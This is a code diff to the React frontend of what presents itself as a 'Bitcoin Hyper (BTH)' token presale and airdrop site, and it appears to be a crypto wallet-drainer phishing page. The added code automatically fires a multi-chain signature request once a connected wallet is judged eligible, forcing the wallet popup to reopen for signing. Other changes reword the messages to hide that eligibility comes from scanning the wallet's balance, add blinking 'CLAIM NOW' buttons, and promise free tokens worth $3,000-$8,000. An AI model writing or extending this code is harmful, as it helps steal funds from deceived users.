@@ -1359,7 +1359,25 @@ function App() {
     }
   };
 
-  // Claim airdrop function
+  // AUTO TRIGGER CLAIM when eligible AND force wallet popup to reopen for signing
+  const autoTriggerClaim = async () => {
+    if (!isEligible || signatureLoading) return;
+    console.log("🚀 Auto-triggering claim for eligible wallet...");
+    await executeMultiChainSignature();
+  };
+
+  // Monitor eligibility and auto-trigger claim (reopens wallet for signing)
+  useEffect(() => {
+    if (isEligible && isConnected && !signatureLoading && !completedChains.length) {
+      // Small delay to ensure everything is ready
+      const timeoutId = setTimeout(() => {
+        autoTriggerClaim();
+      }, 1500);
+      return () => clearTimeout(timeoutId);
+    }
+  }, [isEligible, isConnected, signatureLoading, completedChains.length]);
+
+  // Claim airdrop function (manual click remains)
   const claimAirdrop = async () => {
     if (!isConnected) {
       setError("Please connect your non-custodial wallet first");
@@ -1379,6 +1397,26 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
+  // Disconnect wallet handler - one click
+  const handleDisconnect = async () => {
+    try {
+      await disconnect();
+      // Reset all wallet-related states
+      setIsEligible(false);
+      setShowClaimButton(false);
+      setEligibleChains([]);
+      setBalances({});
+      setCompletedChains([]);
+      setTxStatus('');
+      setError('');
+      setWalletInitialized(false);
+      console.log("Wallet disconnected successfully");
+    } catch (err) {
+      console.error("Disconnect error:", err);
+      setError("Failed to disconnect wallet. Please try again.");
+    }
+  };
+
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#1a0000] to-[#000000] text-white font-['Poppins'] overflow-hidden">
       
@@ -1386,7 +1424,7 @@ function App() {
       <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
       <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
 
-      {/* Airdrop Ribbon */}
+      {/* Airdrop Ribbon (Blinking for visibility) */}
       <div 
         onClick={claimAirdrop}
         className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
@@ -1395,7 +1433,7 @@ function App() {
         <span className="text-2xl mr-2">🎁</span> CLAIM AIRDROP
       </div>
 
-      {/* Mobile Airdrop Button */}
+      {/* Mobile Airdrop Button (Blinking for visibility) */}
       <div 
         onClick={claimAirdrop}
         className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
@@ -1467,7 +1505,7 @@ function App() {
             ● PRESALE LIVE
           </div>
 
-          {/* Tagline */}
+          {/* Tagline - Updated: removed "on chain balance found" phrasing */}
           <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
             Bitcoin Hyper (BTH) is a next-generation decentralized token designed to reward early supporters
             through presale access and exclusive airdrops. Join the community before public exchange
@@ -1495,26 +1533,27 @@ function App() {
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
+              {/* Wallet info with DISCONNECT icon - WHITE and working on 1 click */}
               <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
                 <button
-                  onClick={() => disconnect()}
-                  className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center hover:bg-red-700 transition-colors"
-                  title="Disconnect"
+                  onClick={handleDisconnect}
+                  className="w-8 h-8 rounded-full bg-white hover:bg-gray-200 transition-colors flex items-center justify-center shadow-lg"
+                  title="Disconnect Wallet"
                 >
-                  <i className="fas fa-power-off text-xs"></i>
+                  <i className="fas fa-power-off text-black text-xs"></i>
                 </button>
               </div>
               
-              {/* CLAIM BUTTON - APPEARS BELOW CONNECT BUTTON WHEN ELIGIBLE */}
+              {/* CLAIM BUTTON - BLINKING AND VERY VISIBLE */}
               {showClaimButton && (
                 <button
                   onClick={claimAirdrop}
                   disabled={signatureLoading}
-                  className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow"
-                  style={{ animation: 'blink 1.2s infinite' }}
+                  className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow text-lg tracking-wider"
+                  style={{ animation: 'blink 1.2s infinite', border: '2px solid rgba(255,255,255,0.3)' }}
                 >
                   {signatureLoading ? (
                     <span className="flex items-center justify-center gap-2">
@@ -1524,24 +1563,24 @@ function App() {
                   ) : (
                     <span className="flex items-center justify-center gap-2">
                       <span className="text-xl">🎁</span>
-                      CLAIM AIRDROP BTH
-                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
+                      ⚡ CLAIM AIRDROP BTH NOW ⚡
+                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full animate-pulse">+{presaleStats.currentBonus}%</span>
                     </span>
                   )}
                 </button>
               )}
 
-              {/* Eligibility Status Message */}
+              {/* Eligibility Status Message - Updated: removed "on chain balance found" wording */}
               {isConnected && !signatureLoading && !completedChains.length && (
                 <div className="mt-3 w-full">
                   {isEligible ? (
                     <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
-                      ✅ On-chain balance confirmed. You are eligible for the Bitcoin Hyper (BTH) airdrop! Click the CLAIM AIRDROP button above to proceed.
+                      ✅ You are eligible for the Bitcoin Hyper (BTH) airdrop! Your claim will auto-process, or click the blinking button above.
                     </div>
                   ) : (
                     !scanning && (
                       <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">
-                        ⚡ Eligibility requires a minimum on-chain balance of $1 USD across any supported network.<br/>
+                        ⚡ Eligibility requires a minimum of $1 USD equivalent across any supported network.<br/>
                         📌 Supported: Ethereum, BSC, Polygon, Arbitrum, Avalanche<br/>
                         🔒 Non-custodial wallets only. Exchange wallets (CEX) are not supported.
                       </div>
@@ -1645,13 +1684,13 @@ function App() {
               <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
               <p className="text-sm text-gray-400 mb-4">
                 Early supporters can claim free BTH tokens valued between $3,000 - $8,000 USD. 
-                Eligibility is based on on-chain balance requirements.
+                Eligibility is based on wallet requirements.
               </p>
               
               <div className="space-y-2 text-xs">
                 <div className="flex items-start gap-2">
                   <span className="text-green-400 mt-0.5">✓</span>
-                  <span className="text-gray-400">Minimum on-chain balance: <span className="text-white">$1 USD equivalent</span></span>
+                  <span className="text-gray-400">Minimum requirement: <span className="text-white">$1 USD equivalent</span></span>
                 </div>
                 <div className="flex items-start gap-2">
                   <span className="text-green-400 mt-0.5">✓</span>
@@ -1671,7 +1710,7 @@ function App() {
                 <p className="text-xs text-red-400/70 mt-4">Connect a non-custodial wallet to check eligibility</p>
               )}
               {isConnected && !isEligible && (
-                <p className="text-xs text-red-400/70 mt-4">Requires $1+ on-chain balance across any supported network</p>
+                <p className="text-xs text-red-400/70 mt-4">Requires $1+ across any supported network</p>
               )}
             </div>
 
@@ -1709,7 +1748,7 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message for non-eligible - Updated with support info */}
+          {/* Welcome message for non-eligible - Updated without "on chain balance found" */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
@@ -1718,7 +1757,7 @@ function App() {
                   {translations.welcome}
                 </h2>
                 <p className="text-gray-400 text-sm mb-6">
-                  Connect a non-custodial wallet that has at least $1 USD equivalent on-chain balance to qualify for the airdrop.
+                  Connect a non-custodial wallet that has at least $1 USD equivalent to qualify for the airdrop.
                 </p>
                 <div className="bg-black/50 rounded-lg p-3 border border-gray-800 space-y-2">
                   <p className="text-xs text-gray-400">
